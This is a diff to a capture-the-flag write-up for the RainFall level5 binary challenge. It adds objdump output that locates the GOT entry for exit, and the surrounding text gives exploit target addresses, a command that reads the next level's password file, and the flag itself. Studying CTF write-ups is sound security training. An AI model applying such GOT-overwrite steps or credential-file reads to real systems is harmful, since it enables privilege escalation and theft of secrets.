@@ -20,6 +20,11 @@ Relevant code:
 0804850a        n()
 ```
 
+```
+level5@RainFall:~$ objdump -R level5 | grep exit
+08049828 R_386_JUMP_SLOT   _exit
+08049838 R_386_JUMP_SLOT   exit
+```
 GOT address for `exit`: 0x08049838
 Address of `o()`: 0x080484a4
 
@@ -70,5 +75,3 @@ After running the exploit, we get a shell as level6 and can read the password:
 cat /home/user/level6/.pass
 d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
-
-Copy the password for the next level. 
